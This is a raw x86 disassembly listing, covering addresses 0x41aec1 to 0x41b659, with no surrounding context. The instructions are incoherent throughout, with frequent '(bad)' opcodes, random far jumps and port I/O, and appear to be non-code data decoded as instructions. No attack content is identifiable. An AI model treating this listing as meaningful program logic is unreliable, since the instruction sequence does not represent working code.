  41aec1:	pop    ecx
  41aec2:	push   es
  41aec3:	inc    ecx
  41aec4:	xchg   ebx,eax
  41aec5:	jge    0x41af04
  41aec7:	or     eax,0xf05bfd1
  41aecc:	push   es
  41aecd:	mov    gs,edi
  41aecf:	xor    eax,0x4c2e861f
  41aed4:	pop    ebx
  41aed5:	les    edi,FWORD PTR [ebp+ebx*2+0x1a]
  41aed9:	sbb    DWORD PTR [ecx-0x36f3009a],ebp
  41aedf:	push   ecx
  41aee0:	mov    ebx,0xee41091e
  41aee5:	ror    BYTE PTR [edx+esi*8+0x18283319],0x56
  41aeed:	pop    ecx
  41aeee:	mov    ebx,0x9252c3eb
  41aef3:	add    al,0x9a
  41aef5:	push   edi
  41aef6:	fsubr  QWORD PTR [ecx-0x58c3ab6b]
  41aefc:	adc    al,0x30
  41aefe:	xchg   ecx,eax
  41aeff:	mov    bl,0x75
  41af01:	lea    esi,[eax+ecx*8-0x4a]
  41af05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af06:	(bad)  
  41af07:	in     al,0x1b
  41af09:	lock add DWORD PTR [edi+0x4c],edi
  41af0d:	xor    BYTE PTR [ecx],ch
  41af0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af10:	push   esi
  41af11:	imul   ebx,edx,0xffffff89
  41af14:	adc    ecx,ebp
  41af16:	repnz retf 0xbfcb
  41af1a:	jns    0x41af2f
  41af1c:	ror    cl,1
  41af1e:	(bad)  
  41af1f:	pop    edi
  41af20:	mov    DWORD PTR [ebp-0x3b6b6d6b],ebp
  41af26:	mov    esp,0xaf385d6c
  41af2b:	mov    edx,ecx
  41af2d:	pop    edx
  41af2e:	add    eax,0xac614127
  41af33:	int3   
  41af34:	aaa    
  41af35:	dec    ecx
  41af36:	dec    ebp
  41af37:	cld    
  41af38:	and    DWORD PTR [edx+0x1bc701d1],edi
  41af3e:	jae    0x41af51
  41af40:	call   0x9654c6
  41af45:	in     eax,0x4d
  41af47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af48:	dec    esp
  41af49:	sub    ah,BYTE PTR [edi-0x689f940e]
  41af4f:	int3   
  41af50:	cmp    al,0xe4
  41af52:	or     bh,dl
  41af54:	fiadd  DWORD PTR [esi-0x7558148e]
  41af5a:	in     al,dx
  41af5b:	mov    BYTE PTR [ecx],dl
  41af5d:	cmp    al,al
  41af5f:	mov    ecx,es
  41af61:	pop    ecx
  41af62:	push   ebp
  41af63:	xor    DWORD PTR [esi-0x6b80e64e],esi
  41af69:	adc    BYTE PTR [ebx],cl
  41af6b:	mov    cl,0x84
  41af6d:	mov    cl,0xb6
  41af6f:	adc    ebx,edx
  41af71:	mov    al,0x74
  41af73:	adc    edx,edi
  41af75:	cmp    al,0x81
  41af77:	push   ds
  41af78:	and    BYTE PTR [ecx+ebp*1+0x47],dh
  41af7c:	cmp    al,0x64
  41af7e:	in     al,dx
  41af7f:	out    0x22,eax
  41af81:	xchg   esp,eax
  41af82:	jns    0x41af3a
  41af84:	xor    BYTE PTR [ebx+0x527941e9],0xb0
  41af8b:	adc    al,0xd4
  41af8d:	ins    DWORD PTR es:[edi],dx
  41af8e:	(bad)  
  41af8f:	repz shl al,cl
  41af92:	test   al,0xa6
  41af94:	jmp    0x20d8db53
  41af99:	sti    
  41af9a:	mov    dh,0x23
  41af9c:	stos   BYTE PTR es:[edi],al
  41af9d:	xchg   esi,eax
  41af9e:	aam    0xb4
  41afa0:	xchg   edx,eax
  41afa1:	add    ch,BYTE PTR [ecx+edi*2-0x60354dbe]
  41afa8:	add    ch,BYTE PTR [ebp+ebp*2-0x784ce70b]
  41afaf:	mov    ebp,0xbf420c6
  41afb4:	enter  0x6eef,0x5f
  41afb8:	ds jg  0x41af8c
  41afbb:	push   eax
  41afbc:	das    
  41afbd:	pusha  
  41afbe:	dec    ebp
  41afbf:	ror    DWORD PTR [edx+0x77],1
  41afc2:	(bad)  
  41afc3:	icebp  
  41afc4:	adc    BYTE PTR [eax],0xfd
  41afc7:	popf   
  41afc8:	xor    BYTE PTR [esi+ebx*8+0xd409f0f],dl
  41afcf:	sub    esp,DWORD PTR [edx-0x69f24c5f]
  41afd5:	ja     0x41af5a
  41afd7:	lock jb 0x41afb6
  41afda:	pop    ebp
  41afdb:	shufps xmm5,XMMWORD PTR [esi-0x70],0x5e
  41afe0:	mov    ah,0xb5
  41afe2:	(bad)  
  41afe5:	call   0x9558313d
  41afea:	pop    edi
  41afeb:	xchg   esp,eax
  41afec:	mov    ah,0xcc
  41afee:	xor    DWORD PTR [edx],ebx
  41aff0:	and    edx,DWORD PTR [ebp+0x193d6e47]
  41aff6:	push   es
  41aff7:	mov    ch,BYTE PTR [esi-0x19]
  41affa:	iret   
  41affb:	daa    
  41affc:	cmp    esi,eax
  41affe:	test   al,0x95
  41b000:	sbb    DWORD PTR [ebx-0x4a],esp
  41b003:	es mov edx,0xa19a73e0
  41b009:	sbb    esp,DWORD PTR ds:0xe3d796db
  41b00f:	jle    0x41b014
  41b011:	mov    esi,0x8718b66c
  41b016:	pushf  
  41b017:	mov    ah,0x63
  41b019:	ins    DWORD PTR es:[edi],dx
  41b01a:	in     eax,0xff
  41b01c:	fst    DWORD PTR [ecx+0x70]
  41b01f:	xchg   esi,eax
  41b020:	pop    ds
  41b021:	jb     0x41b040
  41b023:	loope  0x41b04b
  41b025:	nop
  41b026:	push   0xc93ea612
  41b02b:	mov    esp,DWORD PTR [edi-0x21]
  41b02e:	lods   eax,DWORD PTR ds:[esi]
  41b02f:	pop    ecx
  41b030:	das    
  41b031:	push   edx
  41b032:	je     0x41b001
  41b034:	pop    edx
  41b035:	inc    ebp
  41b036:	in     al,dx
  41b037:	xchg   BYTE PTR [ebx],dh
  41b039:	or     al,0xb7
  41b03b:	push   eax
  41b03c:	ins    BYTE PTR es:[edi],dx
  41b03d:	push   eax
  41b03e:	and    DWORD PTR [ebp-0x47a8f1a],esi
  41b044:	int    0xc3
  41b046:	ins    DWORD PTR es:[edi],dx
  41b047:	clc    
  41b048:	les    ebx,FWORD PTR [ecx]
  41b04a:	sub    eax,0x2f6fbaef
  41b04f:	ror    dl,1
  41b051:	jmp    0x3812:0x9a98e790
  41b058:	adc    ah,dl
  41b05a:	mov    dl,0x66
  41b05c:	mov    dl,0x6e
  41b05e:	or     dl,BYTE PTR [ebx+0x6435b5b7]
  41b064:	icebp  
  41b065:	xor    DWORD PTR [esi-0x7e28f573],0xffffffca
  41b06c:	mov    dh,0x7e
  41b06e:	xor    BYTE PTR [edi-0x6b43dca4],ch
  41b074:	xchg   ecx,eax
  41b075:	add    BYTE PTR [edi],dh
  41b077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b078:	push   cs
  41b079:	fwait
  41b07a:	inc    eax
  41b07b:	jnp    0x41b042
  41b07d:	adc    BYTE PTR [esp+ecx*1+0x8],dl
  41b081:	ret    0x95f3
  41b084:	(bad)  
  41b085:	popf   
  41b086:	sub    BYTE PTR [eax],0xdf
  41b089:	daa    
  41b08a:	(bad)  
  41b08b:	sbb    DWORD PTR [edx-0x4],ecx
  41b08e:	(bad)  
  41b08f:	adc    al,BYTE PTR [edi]
  41b091:	sar    cl,cl
  41b093:	xchg   edi,eax
  41b094:	(bad)  
  41b095:	popa   
  41b096:	cmp    BYTE PTR [ebx+eiz*4],dh
  41b099:	and    al,0xfa
  41b09b:	fsubr  st(5),st
  41b09d:	call   0x33ee7b77
  41b0a2:	push   cs
  41b0a3:	or     BYTE PTR [ecx+0x13],0x99
  41b0a7:	ins    DWORD PTR es:[edi],dx
  41b0a8:	cmc    
  41b0a9:	cdq    
  41b0aa:	mov    al,0x1a
  41b0ac:	shl    DWORD PTR [ebx],cl
  41b0ae:	cdq    
  41b0af:	inc    esi
  41b0b0:	lahf   
  41b0b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0b2:	(bad)  
  41b0b4:	ds icebp 
  41b0b6:	and    al,0xfe
  41b0b8:	dec    edx
  41b0b9:	mov    ch,0xae
  41b0bb:	xchg   BYTE PTR [ecx+0x42],bl
  41b0be:	mov    dl,0xd4
  41b0c0:	sbb    ecx,DWORD PTR [ecx-0x3b]
  41b0c3:	int3   
  41b0c4:	std    
  41b0c5:	aam    0x51
  41b0c7:	push   es
  41b0c8:	std    
  41b0c9:	add    ecx,DWORD PTR [ecx]
  41b0cb:	xor    al,0x79
  41b0cd:	sahf   
  41b0ce:	and    esi,DWORD PTR [edi]
  41b0d0:	fidiv  WORD PTR [esi]
  41b0d2:	mov    bh,0xc6
  41b0d4:	add    BYTE PTR [edi+ecx*2-0x62],al
  41b0d8:	aaa    
  41b0d9:	xor    edi,edx
  41b0db:	xor    cl,BYTE PTR [edx]
  41b0dd:	xchg   ecx,eax
  41b0de:	lods   eax,DWORD PTR ds:[esi]
  41b0df:	sbb    eax,0x2eaab93b
  41b0e4:	ss sub al,cl
  41b0e7:	imul   ebx,DWORD PTR [ecx+ebp*4+0x611b7b20],0xffffff98
  41b0ef:	pop    eax
  41b0f0:	sub    bl,ch
  41b0f2:	mov    eax,ds:0x1658b65c
  41b0f7:	mov    dh,0x3
  41b0f9:	enter  0x7596,0x9b
  41b0fd:	mov    eax,ds:0x685b7f7a
  41b102:	loopne 0x41b0f0
  41b104:	jmp    0x41b108
  41b106:	popf   
  41b107:	dec    ebp
  41b108:	sbb    DWORD PTR [edi+0x43689f81],ebx
  41b10e:	imul   edi,DWORD PTR [eax-0x5c],0x19
  41b112:	adc    eax,0xc6590aa2
  41b117:	adc    cl,BYTE PTR [ebx]
  41b119:	cwde   
  41b11a:	cwde   
  41b11b:	xor    ah,ah
  41b11d:	nop
  41b11e:	icebp  
  41b11f:	out    0x7d,eax
  41b121:	(bad)  
  41b122:	and    al,0x89
  41b124:	add    cl,BYTE PTR ds:0x49f7b839
  41b12a:	add    DWORD PTR [ebp+ecx*2-0x5],0xfc88817
  41b132:	hlt    
  41b133:	jb     0x41b1a6
  41b135:	ja     0x41b17f
  41b137:	mov    ebx,0xe9723344
  41b13c:	push   ds
  41b13d:	push   ecx
  41b13e:	cs jge 0x41b0f1
  41b141:	loopne 0x41b18c
  41b143:	or     eax,0x289b3dd5
  41b148:	xchg   ecx,eax
  41b149:	xor    esi,0x6c
  41b14c:	dec    eax
  41b14d:	add    BYTE PTR [eax],al
  41b14f:	add    BYTE PTR [eax],al
  41b151:	add    ah,bh
  41b153:	es out dx,eax
  41b155:	mov    eax,ds:0x7ffee9ff
  41b15a:	jmp    edx
  41b15c:	fdivp  st(6),st
  41b15e:	push   esi
  41b15f:	dec    eax
  41b160:	xlat   BYTE PTR ds:[ebx]
  41b161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b162:	(bad)  
  41b163:	sub    eax,0x4f30001
  41b168:	add    BYTE PTR [eax],al
  41b16a:	or     DWORD PTR [ebp+0x219cc6b8],edi
  41b170:	or     al,0xae
  41b172:	sub    BYTE PTR [esi+esi*4],bl
  41b175:	sti    
  41b176:	ret    0x678b
  41b179:	cmp    eax,0xfa909d66
  41b17e:	push   0xb3f81d88
  41b183:	ret    
  41b184:	mov    eax,0x4a8b8d78
  41b189:	mov    ds:0x1ed529c0,al
  41b18e:	mov    ah,0x9c
  41b190:	xchg   DWORD PTR [esi-0x4a],ecx
  41b193:	popf   
  41b194:	rcr    DWORD PTR ds:0xf8738b26,1
  41b19a:	repz in eax,dx
  41b19c:	mov    ds:0x481d851,al
  41b1a1:	iret   
  41b1a2:	out    dx,al
  41b1a3:	in     al,0x94
  41b1a5:	rcr    DWORD PTR [eax-0x44],cl
  41b1a8:	ret    0x48ce
  41b1ab:	stos   BYTE PTR es:[edi],al
  41b1ac:	adc    al,0xe3
  41b1ae:	cld    
  41b1af:	xchg   esp,eax
  41b1b0:	pop    ss
  41b1b1:	push   ss
  41b1b2:	(bad)  
  41b1b4:	xor    eax,0x5e026e95
  41b1b9:	rcr    BYTE PTR [ecx+0x10],1
  41b1bc:	mov    eax,ds:0xd38ae924
  41b1c1:	and    al,BYTE PTR [edi+0x7c]
  41b1c4:	inc    ebx
  41b1c5:	add    al,BYTE PTR [ebp+0x68843a8e]
  41b1cb:	push   esi
  41b1cc:	add    BYTE PTR [eax],dh
  41b1ce:	dec    edi
  41b1cf:	push   ss
  41b1d0:	add    bl,BYTE PTR [edi+0x1920d56b]
  41b1d6:	stos   BYTE PTR es:[edi],al
  41b1d7:	icebp  
  41b1d8:	adc    BYTE PTR ds:0x2fde9b6c,dl
  41b1de:	cmp    al,al
  41b1e0:	sub    ah,BYTE PTR [ecx+0xcff72d0]
  41b1e6:	or     DWORD PTR [edi+0x1051b2cd],edx
  41b1ec:	jne    0x41b18d
  41b1ee:	mov    esi,0xf0d5ee22
  41b1f3:	adc    eax,0x282ff2d2
  41b1f8:	cwde   
  41b1f9:	ret    0x97ea
  41b1fc:	in     eax,dx
  41b1fd:	shl    BYTE PTR [esi],cl
  41b1ff:	dec    edi
  41b200:	test   al,0xec
  41b202:	stc    
  41b203:	mov    dl,0x55
  41b205:	mov    ah,0x3d
  41b207:	xchg   DWORD PTR [edi-0x35af2538],edx
  41b20d:	sti    
  41b20e:	sti    
  41b20f:	bound  esi,QWORD PTR [ebx+edx*1]
  41b212:	arpl   WORD PTR [esp-0x3576801d],bx
  41b219:	xor    DWORD PTR [eax],0xffffffdc
  41b21c:	aam    0x4f
  41b21e:	xchg   edx,eax
  41b21f:	push   es
  41b220:	mov    bh,0xaf
  41b222:	ret    
  41b223:	shl    DWORD PTR [ebx+0xc],cl
  41b226:	jl     0x41b1a8
  41b228:	mov    edx,0x83343075
  41b22d:	pop    esi
  41b22e:	mov    al,ds:0xf27be6a0
  41b233:	rol    BYTE PTR [eax-0x62],cl
  41b236:	mov    ds:0x5b5be100,eax
  41b23b:	inc    DWORD PTR ds:0xa9146d66
  41b241:	or     ch,BYTE PTR [ecx]
  41b243:	push   ds
  41b244:	jp     0x41b1c8
  41b246:	xchg   ecx,eax
  41b247:	or     al,bh
  41b249:	or     BYTE PTR [eax],ch
  41b24b:	popf   
  41b24c:	cmp    al,0x67
  41b24e:	xor    bl,BYTE PTR [edi+0x3c]
  41b251:	adc    DWORD PTR [edi-0x293fc08b],edi
  41b257:	sbb    eax,0x149b1e4
  41b25c:	xchg   esp,eax
  41b25d:	mov    cl,0x1c
  41b25f:	rol    BYTE PTR [edi+eax*4+0x7d],1
  41b263:	daa    
  41b264:	mov    al,0xe6
  41b266:	jge    0x41b266
  41b268:	adc    al,0xf9
  41b26a:	and    DWORD PTR [edx+ebp*2-0x79e9a1ad],edx
  41b271:	or     ecx,DWORD PTR [ebx-0x2881091c]
  41b277:	jp     0x41b251
  41b279:	or     DWORD PTR [ecx+ebx*4],esp
  41b27c:	jecxz  0x41b222
  41b27e:	and    DWORD PTR [eax-0x1],0xa40d5dfd
  41b285:	dec    eax
  41b286:	ror    dl,cl
  41b288:	pop    ebx
  41b289:	sub    BYTE PTR [edi],ch
  41b28b:	into   
  41b28c:	ror    DWORD PTR [esp+esi*8-0x9],cl
  41b290:	jae    0x41b28b
  41b292:	fcmovu st,st(0)
  41b294:	ret    0xecdf
  41b297:	mov    edx,0x62f207b6
  41b29c:	rol    al,0x76
  41b29f:	cmp    edi,ebx
  41b2a1:	jmp    0x817b:0x5bad4bba
  41b2a8:	outs   dx,DWORD PTR ds:[esi]
  41b2a9:	mov    eax,ds:0x9ee2a75b
  41b2ae:	xchg   ebx,eax
  41b2af:	jo     0x41b323
  41b2b1:	int3   
  41b2b2:	and    edx,esp
  41b2b4:	mov    bh,0xee
  41b2b6:	mov    dl,0xed
  41b2b8:	call   0x8d04f157
  41b2bd:	retf   0x6758
  41b2c0:	xor    dh,BYTE PTR [ebp+0x142ea05f]
  41b2c6:	inc    ebx
  41b2c7:	lds    edx,FWORD PTR [ebp+0x64]
  41b2ca:	mov    cl,0x80
  41b2cc:	mov    ebp,0xa3f7fe20
  41b2d1:	cmc    
  41b2d2:	mov    ah,0x36
  41b2d4:	dec    ecx
  41b2d5:	addr16 popa 
  41b2d7:	pop    esp
  41b2d8:	sub    al,0x54
  41b2da:	push   ss
  41b2db:	lahf   
  41b2dc:	mov    ebx,0xc06b0b3b
  41b2e1:	icebp  
  41b2e2:	stc    
  41b2e3:	cmp    eax,0xa132c771
  41b2e8:	out    0x2a,eax
  41b2ea:	sub    BYTE PTR [esi+eiz*2-0x3e9cacb0],dl
  41b2f1:	shl    BYTE PTR [eax-0x1],1
  41b2f4:	inc    edi
  41b2f5:	rcr    BYTE PTR [ebx],0x16
  41b2f8:	dec    edi
  41b2f9:	lahf   
  41b2fa:	es push ss
  41b2fc:	mov    esp,0x3d80d1aa
  41b301:	into   
  41b302:	jmp    DWORD PTR [ebx+eax*4]
  41b305:	mov    dl,0xee
  41b307:	lods   al,BYTE PTR ds:[esi]
  41b308:	mov    edx,0xa4ef50f7
  41b30d:	or     ebp,DWORD PTR [esi-0x4e]
  41b310:	pop    ecx
  41b311:	xor    al,0x55
  41b313:	jno    0x41b331
  41b315:	mov    edx,DWORD PTR [ecx-0x385d294b]
  41b31b:	ja     0x41b2fc
  41b31d:	xchg   esp,eax
  41b31e:	pop    ebp
  41b31f:	push   eax
  41b320:	add    ch,BYTE PTR [ebx+0x71f2723a]
  41b326:	xor    dl,BYTE PTR [ebx]
  41b328:	jmp    0x4afa:0x4871647c
  41b32f:	push   edx
  41b330:	out    dx,al
  41b331:	jg     0x41b2c8
  41b333:	out    0x15,eax
  41b335:	(bad)  
  41b336:	fldenv [edi-0x1a1e8c25]
  41b33c:	jge    0x41b342
  41b33e:	nop
  41b33f:	aad    0xda
  41b341:	jmp    0xc731e0
  41b346:	cmp    eax,0xe801e3e
  41b34b:	ret    0x234f
  41b34e:	xor    eax,0x456f04b9
  41b353:	add    al,0x8
  41b355:	push   esp
  41b356:	(bad)  [edi+0x39793928]
  41b35c:	dec    esi
  41b35d:	ss repz pop ss
  41b360:	idiv   BYTE PTR [edx-0xe67ffb4]
  41b366:	rcl    DWORD PTR [edi+0x3af72025],1
  41b36c:	iret   
  41b36d:	jmp    0x41b33b
  41b36f:	imul   ebp,ecx,0x18ba7d8d
  41b375:	sub    BYTE PTR [esi-0x6f],al
  41b378:	and    eax,0x6171652c
  41b37d:	int    0xa0
  41b37f:	cli    
  41b380:	(bad)  
  41b381:	pop    ds
  41b382:	and    al,0x65
  41b384:	mov    edi,0xa2a30a36
  41b389:	pop    ebx
  41b38a:	test   eax,0x2a6a5b48
  41b38f:	dec    eax
  41b390:	sbb    edi,DWORD PTR [ebp+0x20]
  41b393:	jg     0x41b359
  41b395:	sbb    DWORD PTR [esi+esi*8-0x43375683],0x6
  41b39d:	pop    edx
  41b39e:	clc    
  41b39f:	mov    ebp,0x248b8e30
  41b3a4:	push   ebp
  41b3a5:	and    BYTE PTR ds:0x75863b92,dl
  41b3ab:	fcom   DWORD PTR [ebp-0x504fded5]
  41b3b1:	push   0x3e
  41b3b3:	inc    ecx
  41b3b4:	jmp    FWORD PTR [esi]
  41b3b6:	pop    eax
  41b3b7:	shl    DWORD PTR [esi+0x1c],cl
  41b3ba:	xor    edi,DWORD PTR [ebx+0x3d3c4314]
  41b3c0:	cmp    bl,ch
  41b3c2:	(bad)  
  41b3c3:	pop    edx
  41b3c4:	cld    
  41b3c5:	clc    
  41b3c6:	mov    al,ds:0x396ebb70
  41b3cb:	xor    eax,0x606aab64
  41b3d0:	sub    BYTE PTR [ecx+0x3c],bl
  41b3d3:	int3   
  41b3d4:	nop
  41b3d5:	loop   0x41b376
  41b3d7:	sub    al,0xa4
  41b3d9:	cmp    BYTE PTR [edx],ah
  41b3db:	xchg   edi,eax
  41b3dc:	int    0x45
  41b3de:	mov    dl,0x75
  41b3e0:	rol    BYTE PTR [ecx+0x6add09da],1
  41b3e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3e7:	xchg   esi,eax
  41b3e8:	jmp    0xf73d:0x2de8da85
  41b3ef:	test   DWORD PTR [ecx+0x2b],0x24d05e75
  41b3f6:	in     eax,0x48
  41b3f8:	int    0x48
  41b3fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3fb:	mov    BYTE PTR [ebp-0x6fe7cd66],dl
  41b401:	stc    
  41b402:	inc    ecx
  41b403:	xor    BYTE PTR [edx+0x5f],dh
  41b406:	push   0xf9219f91
  41b40b:	sti    
  41b40c:	sbb    ah,dl
  41b40e:	in     eax,dx
  41b40f:	mov    ds:0xe5cb1067,eax
  41b414:	js     0x41b3a4
  41b416:	mov    WORD PTR [ebx],?
  41b418:	fwait
  41b419:	jbe    0x41b3fe
  41b41b:	push   ecx
  41b41c:	lods   eax,DWORD PTR ds:[esi]
  41b41d:	mov    edi,0xb40b9677
  41b422:	hlt    
  41b423:	pop    ecx
  41b424:	mov    ecx,0x9624a7fc
  41b429:	adc    edi,DWORD PTR [ebx-0x31]
  41b42c:	dec    ecx
  41b42d:	push   ecx
  41b42e:	lods   eax,DWORD PTR ds:[esi]
  41b42f:	pop    ss
  41b430:	int3   
  41b431:	enter  0x91b4,0x57
  41b435:	pop    esi
  41b436:	mov    ecx,0xc5e8107e
  41b43b:	iret   
  41b43c:	dec    edx
  41b43d:	ror    ch,0x4b
  41b440:	pushf  
  41b441:	and    DWORD PTR [ebp+ecx*2-0x5408138b],ebx
  41b448:	sbb    edx,ebx
  41b44a:	dec    esi
  41b44b:	jbe    0x41b4ae
  41b44d:	rcr    edx,cl
  41b44f:	pop    ds
  41b450:	sub    eax,0x2e067013
  41b455:	mov    ds:0x40116104,al
  41b45a:	add    BYTE PTR ds:0x3bd94a44,bl
  41b460:	and    ebx,esi
  41b462:	or     ebp,DWORD PTR [eax-0x5]
  41b465:	inc    esp
  41b466:	add    BYTE PTR [edx],bh
  41b468:	inc    eax
  41b469:	sbb    cl,dh
  41b46b:	sub    al,0xe8
  41b46d:	(bad)  
  41b46e:	sbb    ebx,edx
  41b470:	mov    eax,ds:0xc301f7b8
  41b475:	out    dx,eax
  41b476:	dec    esp
  41b477:	dec    esp
  41b478:	pop    ebx
  41b479:	mov    ah,0x53
  41b47b:	cs pushf 
  41b47d:	ret    
  41b47e:	jne    0x41b45c
  41b480:	pop    ebx
  41b481:	push   es
  41b482:	mul    BYTE PTR [ecx-0x16]
  41b485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b486:	pop    esp
  41b487:	cdq    
  41b488:	enter  0x7241,0x32
  41b48c:	mov    edx,0x5f9e630a
  41b491:	ins    DWORD PTR es:[edi],dx
  41b492:	call   0xaf03:0xfaff2652
  41b499:	push   ebp
  41b49a:	(bad)  
  41b49b:	icebp  
  41b49c:	cwde   
  41b49d:	dec    esi
  41b49e:	(bad)  
  41b49f:	in     al,dx
  41b4a0:	retf   0xebf4
  41b4a3:	std    
  41b4a4:	mov    bl,0x29
  41b4a6:	aad    0x63
  41b4a8:	inc    esp
  41b4a9:	jns    0x41b454
  41b4ab:	sbb    al,0x64
  41b4ad:	push   edx
  41b4ae:	pusha  
  41b4af:	ds inc esp
  41b4b1:	cmp    ch,BYTE PTR [eax+eiz*1-0x2a]
  41b4b5:	rol    BYTE PTR [ecx+0x3bd55e7f],0x6b
  41b4bc:	mov    cs,ebx
  41b4be:	scas   eax,DWORD PTR es:[edi]
  41b4bf:	sbb    BYTE PTR [edx-0x693b141b],al
  41b4c5:	pop    esi
  41b4c6:	scas   eax,DWORD PTR es:[edi]
  41b4c7:	jecxz  0x41b514
  41b4c9:	fcmovnb st,st(7)
  41b4cb:	sub    ah,al
  41b4cd:	(bad)  
  41b4ce:	pop    eax
  41b4cf:	pop    esp
  41b4d0:	add    al,0x62
  41b4d2:	cs push esp
  41b4d4:	cmc    
  41b4d5:	mov    ah,0xd3
  41b4d7:	inc    eax
  41b4d8:	dec    ebx
  41b4d9:	xor    ecx,eax
  41b4db:	cmp    al,0x6e
  41b4dd:	retf   
  41b4de:	and    BYTE PTR ds:0x149bb844,ch
  41b4e4:	out    0xfc,al
  41b4e6:	and    dl,cl
  41b4e8:	ror    BYTE PTR [ebp+0x5ca1f901],0xa0
  41b4ef:	or     ecx,DWORD PTR [esi+0x24]
  41b4f2:	mov    DWORD PTR [ebx+0x417f4a1d],esp
  41b4f8:	or     BYTE PTR [edi],cl
  41b4fa:	add    esp,esp
  41b4fc:	in     al,0x98
  41b4fe:	fs in  al,dx
  41b500:	inc    ecx
  41b501:	iret   
  41b502:	mov    ch,0x20
  41b504:	mov    eax,0x6516b248
  41b509:	mov    dh,0x4b
  41b50b:	loop   0x41b4dc
  41b50d:	mov    al,ds:0x18c8efdb
  41b512:	xor    DWORD PTR [eax+0x458fb711],edi
  41b518:	jb     0x41b543
  41b51a:	or     BYTE PTR [eax+0x51],cl
  41b51d:	addr16 jmp 0x41b58e
  41b520:	(bad)  
  41b521:	mov    ah,0x7a
  41b523:	cmp    al,0xc0
  41b525:	aas    
  41b526:	mov    ah,BYTE PTR [edx+ebp*2-0x132762a2]
  41b52d:	add    BYTE PTR [ecx+0x759aeafe],bl
  41b533:	adc    eax,eax
  41b535:	jae    0x41b4f2
  41b537:	jmp    0x2771:0x3d946c9f
  41b53e:	daa    
  41b53f:	mov    ah,0x20
  41b541:	xchg   edx,eax
  41b542:	xchg   ebx,eax
  41b543:	jne    0x41b516
  41b545:	(bad)  
  41b546:	sub    BYTE PTR [esi],ah
  41b548:	mov    eax,ds:0x9ea1e8
  41b54d:	mov    al,ds:0xd426a179
  41b552:	sbb    ecx,DWORD PTR [ebp-0x757d2e47]
  41b558:	mov    ch,0xd3
  41b55a:	cli    
  41b55b:	jmp    0x69f8:0xb88b72a2
  41b562:	mov    ss,WORD PTR [esp+ebp*2+0x5]
  41b566:	inc    ebx
  41b567:	jbe    0x41b557
  41b569:	push   edx
  41b56a:	fs retf 
  41b56c:	xchg   ebp,eax
  41b56d:	shl    DWORD PTR [ebp+0x2f],cl
  41b570:	loope  0x41b584
  41b572:	ins    BYTE PTR es:[edi],dx
  41b573:	jmp    0x41b5e2
  41b575:	or     ecx,ebx
  41b577:	push   ecx
  41b578:	mov    ebx,0x5501f51b
  41b57d:	or     ecx,DWORD PTR [ebx-0x13]
  41b580:	xchg   ebp,eax
  41b581:	sbb    bl,al
  41b583:	out    dx,eax
  41b584:	mov    al,al
  41b586:	call   0x6bb10898
  41b58b:	fxch   st(2)
  41b58d:	nop
  41b58e:	scas   eax,DWORD PTR es:[edi]
  41b58f:	shl    BYTE PTR [ecx],cl
  41b591:	cmp    BYTE PTR [edi-0x1ea77f36],cl
  41b597:	xor    BYTE PTR [edi],0x7a
  41b59a:	or     DWORD PTR [ebp-0x674974ee],esi
  41b5a0:	(bad)  
  41b5a2:	jg     0x41b602
  41b5a4:	dec    esi
  41b5a5:	or     DWORD PTR [edi+0x48],0x4ec1f81d
  41b5ac:	int    0xb1
  41b5ae:	fbld   TBYTE PTR [edx]
  41b5b0:	add    eax,0xdfe15ca6
  41b5b5:	jmp    0x84cceee6
  41b5ba:	dec    DWORD PTR [ebp+0x69820c50]
  41b5c0:	ins    BYTE PTR es:[edi],dx
  41b5c1:	mov    ds:0xea69cacc,eax
  41b5c6:	test   DWORD PTR [edx-0x25],esi
  41b5c9:	jbe    0x41b5ee
  41b5cb:	stc    
  41b5cc:	data16 mov dh,0x33
  41b5cf:	xchg   ebx,eax
  41b5d0:	mov    edi,0x756cbc55
  41b5d5:	in     al,dx
  41b5d6:	cmp    bh,BYTE PTR [esi-0x1a]
  41b5d9:	push   es
  41b5da:	pusha  
  41b5db:	stc    
  41b5dc:	inc    esp
  41b5dd:	in     eax,0x64
  41b5df:	(bad)  [ecx+0x56]
  41b5e2:	adc    al,0xee
  41b5e4:	ins    BYTE PTR es:[edi],dx
  41b5e5:	inc    eax
  41b5e6:	xchg   esp,eax
  41b5e7:	push   edx
  41b5e8:	sbb    BYTE PTR [ebx],al
  41b5ea:	(bad)  
  41b5eb:	sub    esi,ebx
  41b5ed:	int    0x93
  41b5ef:	and    eax,0x34112683
  41b5f4:	and    DWORD PTR [ebx+0x60],esi
  41b5f7:	mov    ah,0x26
  41b5f9:	scas   al,BYTE PTR es:[edi]
  41b5fa:	xchg   ecx,eax
  41b5fb:	cld    
  41b5fc:	pop    eax
  41b5fd:	inc    si
  41b5ff:	ja     0x41b649
  41b601:	fs mov al,0xcc
  41b604:	out    dx,eax
  41b605:	in     eax,dx
  41b606:	loopne 0x41b636
  41b608:	out    0x18,eax
  41b60a:	inc    edi
  41b60b:	pop    edi
  41b60c:	jo     0x41b620
  41b60e:	and    DWORD PTR [eax+0x4b],edx
  41b611:	sub    eax,0x15c94fb1
  41b616:	rcl    DWORD PTR [esi-0xd],cl
  41b619:	sub    ecx,DWORD PTR [edx+eiz*2-0x33942cf1]
  41b620:	fisub  WORD PTR [eax+0x49]
  41b623:	push   ecx
  41b624:	out    0xb0,eax
  41b626:	gs jno 0x41b5f5
  41b629:	push   ebx
  41b62a:	test   eax,0xdc663444
  41b62f:	inc    esp
  41b630:	je     0x41b624
  41b632:	cs mov ebx,0xd25fde0
  41b638:	mov    ch,0x96
  41b63a:	push   0x56
  41b63c:	bound  esi,QWORD PTR [edx+ebp*2-0x28]
  41b640:	mov    cl,0x2b
  41b642:	out    dx,al
  41b643:	add    eax,0xb0ff72c1
  41b648:	jmp    DWORD PTR [ebp-0x40]
  41b64b:	ins    BYTE PTR es:[edi],dx
  41b64c:	jne    0x41b5f0
  41b64e:	or     DWORD PTR [edi],ebx
  41b650:	lds    edx,FWORD PTR [edi-0xbf8c94c]
  41b656:	ja     0x41b614
  41b658:	hlt    
  41b659:	jge    0x41b64a
